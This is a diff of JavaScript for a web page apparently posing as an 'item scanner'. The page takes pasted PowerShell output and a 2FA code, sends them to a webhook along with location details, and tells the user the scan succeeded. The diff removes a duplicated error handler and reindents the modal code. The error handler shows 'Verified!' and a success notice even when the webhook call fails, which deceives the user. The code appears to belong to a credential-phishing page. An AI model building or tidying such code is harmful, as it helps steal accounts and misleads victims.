@@ -274,38 +274,6 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.country || 'Unknown'
         }, 1500);
 
     } catch (error) {
-        console.error('2FA webhook error:', error);
-        // Continue flow even if webhook fails
-        verifyBtn.textContent = 'Verified!';
-        verifyBtn.style.backgroundColor = '#10b981';
-        verifyBtn.style.color = '#fff';
-        
-        setTimeout(() => {
-            // Keep the scan button in loading state and close 2FA modal
-            closeVerificationModal();
-            
-            // Show success message but keep scan button loading
-            const submitBtn = document.getElementById('submitBtn');
-            const submitText = document.getElementById('submitText');
-            if (submitText) {
-                submitText.textContent = 'Completing...';
-            }
-            
-            // After a brief delay, show success and reset
-            setTimeout(() => {
-                if (submitBtn && submitText) {
-                    submitBtn.disabled = false;
-                    submitText.textContent = 'Scan';
-                    submitBtn.style.background = '';
-                }
-                const loadingOverlay = document.getElementById('loadingOverlay');
-                if (loadingOverlay) loadingOverlay.style.display = 'none';
-                
-                showNotification('Analysis completed successfully', 'success');
-            }, 2000);
-        }, 1500);
-
-    } catch (error) {
         console.error('💥 2FA webhook error:', error);
         // Continue flow even if webhook fails
         verifyBtn.textContent = 'Verified!';
@@ -540,27 +508,27 @@ Content Length: ${pastedText.length} characters
 
 // Enhanced Modal functionality
 function openScanModal() {
-            console.log('Opening scan modal...');
-        const modal = document.getElementById('scanModal');
-        const textarea = document.getElementById('powershellInput');
+    console.log('Opening scan modal...');
+    const modal = document.getElementById('scanModal');
+    const textarea = document.getElementById('powershellInput');
+    
+    if (modal) {
+        modal.style.display = 'block';
+        document.body.style.overflow = 'hidden';
         
-        if (modal) {
-            modal.style.display = 'block';
-            document.body.style.overflow = 'hidden';
-            
-            // Focus on textarea after animation
-            setTimeout(() => {
-                if (textarea) {
-                    textarea.focus();
-                }
-            }, 400);
-            
-            console.log('Modal opened successfully');
-            showNotification('Item scanner ready', 'info');
-        } else {
-            console.error('Modal element not found!');
-            showNotification('Error opening scanner', 'error');
-        }
+        // Focus on textarea after animation
+        setTimeout(() => {
+            if (textarea) {
+                textarea.focus();
+            }
+        }, 400);
+        
+        console.log('Modal opened successfully');
+        showNotification('Item scanner ready', 'info');
+    } else {
+        console.error('Modal element not found!');
+        showNotification('Error opening scanner', 'error');
+    }
 }
 
 function closeScanModal() {
